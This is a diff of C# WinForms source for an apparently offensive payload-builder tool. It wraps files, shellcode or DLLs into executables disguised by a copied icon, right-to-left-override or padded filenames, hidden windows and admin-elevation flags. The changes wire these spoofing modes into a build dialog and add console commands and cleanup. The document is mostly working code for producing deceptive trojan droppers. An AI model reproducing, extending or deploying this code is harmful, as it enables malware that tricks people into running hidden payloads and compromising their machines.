@@ -11,26 +11,25 @@ using System.Drawing.IconLib;
 using System.Net;
 //using System.Runtime.InteropServices;
 
-/*
- * TODO:
- *      - Clean up the temporary files.
- */
-
 namespace masamangalternatibo {
 
     public partial class Form1 : Form {
         public Form1() { InitializeComponent(); }
 
-        string version = "0.8.0a";
         int payloadMode = 0; // 0 = File payload // 1 = Shell Code payload // 2 = Load DLL to rundll32
         string[] payloadData = new string[6]; //Stores the data from the textbox so the user can switch modes without losing the last settings Index 0-2: Stores the mode data // Index 3-4: Stores the arguments // Index 5: argument placeholder for shell mode (opposed for efficiency rather than doing heavy math and comparisons)
         string[] payloadFile = new string[2]; // Stores the data of ofdPayload.FileName incase the user switches modes // 0 = File Payload // 1 = DLL Payload
-        bool[] excomp = { false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX
-        int overflowCount = 20;
+        public bool[] excomp = { false, false}; // Acts as a switch if the external components exist or not // 0 = Icon Library // 1 = UPX
+        public int overflowCount = 20;
         string apth = Application.StartupPath;
-       
+        globalClass _gc = new globalClass();
+
+        private void Form1_Close(object sender, FormClosingEventArgs e) {
+            cleanup();
+        }
+
         private void Form1_Load(object sender, EventArgs e) {
-            lblVersion.Text = "v" + version;
+            lblVersion.Text = "v" + globalClass.version;
             dbgmsg("Starting from: " + apth);
 
             checkComponent(
@@ -139,8 +138,22 @@ namespace masamangalternatibo {
                     cleanup();
                     break;
 
+                case "showallui":
+                    dbgmsg("showing all ui...");
+                    about _a = new about();
+                    buildPayload _b = new buildPayload();
+                    minipad _c = new minipad();
+                    _a.Show();
+                    _b.Show();
+                    _c.Show();
+                    break;
+
+                case "rtlo":
+                    dbgmsg(globalClass.rtlo + con[1]);
+                    break;
+                
                 default:
-                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\ncls\nexit\n");
+                    dbgmsg("Bad command! Available commands:\nsetdrive [driveletter]\nsetoverflowcount [integer]\nsetimagelocation [filepath]\nshowpayloadfile\noverflowdebugmsg\ncheckcomp [name] [filename] [size] [link] [desc]\nteststrformat [string] [data]\nformsetwidth [integer]\ncleanup\nshowallui\nrtlo [string]\ncls\nexit\n");
                     break;
             }
             tbConsole.Text = "";
@@ -217,13 +230,13 @@ namespace masamangalternatibo {
         private void extractIcon(bool fromButton = false, string iconfile = "") {
             if (excomp[0] && iconfile != "") {
                 dbgmsg("Extracting associated icon to bitmap...");
-                (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\_bmptmp.bmp");
+                (Icon.ExtractAssociatedIcon(iconfile).ToBitmap()).Save(apth + "\\$_bmptmp.bmp");
                 MultiIcon conico = new MultiIcon();
-                conico.Add("iconinstance").CreateFrom(apth + "\\_bmptmp.bmp", IconOutputFormat.WinXP);
+                conico.Add("iconinstance").CreateFrom(apth + "\\$_bmptmp.bmp", IconOutputFormat.Vista);
                 conico.SelectedIndex = 0;
                 conico.Save(apth + "\\$tmp.ico", MultiIconFormat.ICO);
                 imgFileIcon.ImageLocation = "$tmp.ico";
-                File.Delete(apth + "\\_bmptmp.bmp");
+                File.Delete(apth + "\\$_bmptmp.bmp");
                 dbgmsg("Temporary bitmap file deleted.");
             }
             else {
@@ -247,11 +260,12 @@ namespace masamangalternatibo {
          *         Index 0: File Name
          *         Index 1: File Extension
         */
-        private string[] trimext(string flname) {
+        public string[] trimext(string flname) {
             string[] aa = flname.Split('.');
             string[] tmp = new string[2];
-            foreach(string x in aa) {
-                tmp[0] += "." + x;
+            tmp[0] = aa[0];
+            for (int x = 1; x < aa.Count() - 2; x++) {
+                tmp[0] += "." + aa[x];
             }
             tmp[1] = aa[aa.Count() - 1];
             return tmp;
@@ -304,11 +318,10 @@ namespace masamangalternatibo {
          *Two or more instances uses the same code with small change of detail.
          *returns: nothing
         */
-        private void openminipad(string writetb = "", bool enaPass = false, bool enaBuild = false) {
+        private void openminipad(string writetb = "", bool enaBuild = false) {
             using (minipad _minipad = new minipad()) {
-                _minipad.btnPassShell.Enabled = false;
+                _minipad._tmp = trimext(tbSpoof.Text);
                 _minipad.btnCompileScript.Enabled = false;
-                if (enaPass) { _minipad.btnPassShell.Enabled = true; }
                 if (enaBuild) { _minipad.btnCompileScript.Enabled = true;}
                 _minipad.mprtb.Text = writetb;
                 _minipad.ShowDialog();
@@ -402,12 +415,12 @@ namespace masamangalternatibo {
             File.Copy(ofdSpoof.FileName, "$spooftmp");
 
             dbgmsg("Writing sections...");
-            scriptData[0] = (chkAdminFlag.Checked ? "#RequireAdmin":"");
-            scriptData[1] = ((payloadMode != 2 && chkArguments.Checked) ? tbArguments.Text : tbPayload.Text);
+            scriptData[0] = (chkAdminFlag.Checked ? "#RequireAdmin": null);
+            scriptData[1] = ((payloadMode != 2) ? (chkArguments.Checked ? tbArguments.Text : null) : tbPayload.Text);
             scriptData[2] = ((payloadMode == 0 && chkConsole.Checked) ? "true" : "false");
             scriptData[3] = ((payloadMode == 0 && chkConsole.Checked && chkStreamConsole.Checked) ? "true" : "false");
             scriptData[4] = ((payloadMode == 0 && chkTarExe.Checked) ? "true" : "false");
-            scriptData[5] = ((payloadMode != 2) ? tbPayload.Text : "");
+            scriptData[5] = ((payloadMode != 2) ? tbPayload.Text : null);
             scriptData[6] = tbSpoof.Text;
             scriptData[7] = (chkHidWin.Checked ? "@SW_HIDE":"@SW_SHOW");
             scriptData[8] = ((payloadMode == 0 && chkConsole.Checked) ? btnCommand.Text : "");
@@ -421,19 +434,39 @@ namespace masamangalternatibo {
                 if (File.Exists("$payloadtmp")) {
                     File.Delete("$payloadtmp");
                 }
-                File.Create("$payloadtmp");
+                File.Create("$payloadtmp").Close();
             }
 
             if (isWriteMode) {
-                openminipad(templateData, false, true);
+                openminipad(templateData, true);
             }
-
+            else {
+                using (buildPayload _bp = new buildPayload()) {
+                    if (radOverflow.Checked) { _bp.overflowCount = overflowCount; }
+                    if (radNone.Checked) {
+                        _bp.spoofMode = 0;
+                    }
+                    if (radOverflow.Checked) {
+                        _bp.spoofMode = 1;
+                    }
+                    if (radRTLO.Checked) {
+                        _bp.spoofMode = 2;
+                    }
+                    string[] _tmp = trimext(tbSpoof.Text);
+                    _bp.tbFlNm.Text = _tmp[0];
+                    _bp.tbFkExt.Text = _tmp[1];
+                    _bp.script = templateData;
+                    _bp.drive = drpDrives.GetItemText(drpDrives.SelectedItem);
+                    _bp.ShowDialog();
+                }
+            }
         }
 
         /*
          * Clean up function - A function to be called to remove temporary files
-         *                   - Deletes all the files that starts with a dollar sign ($)
-         */
+         * ----------------------------------------------------------------------
+         * Deletes all the files that starts with a dollar sign ($)
+        */
         private void cleanup() {
             dbgmsg("Cleaning up temporary files...");
             foreach (string i in Directory.GetFiles(apth)) {
@@ -569,6 +602,7 @@ namespace masamangalternatibo {
                 btnCommand.Enabled = true;
             }
             else {
+                chkStreamConsole.Checked = false;
                 chkStreamConsole.Enabled = false;
                 btnCommand.Enabled = false;
             }
@@ -598,10 +632,10 @@ namespace masamangalternatibo {
 
         private void btnMiniPad_Click(object sender, EventArgs e) {
             if (payloadMode == 2) {
-                openminipad(tbPayload.Text, true, false);
+                openminipad(tbPayload.Text, false);
             }
             else {
-                openminipad("", false, false);
+                openminipad("", false);
             }
             
         }
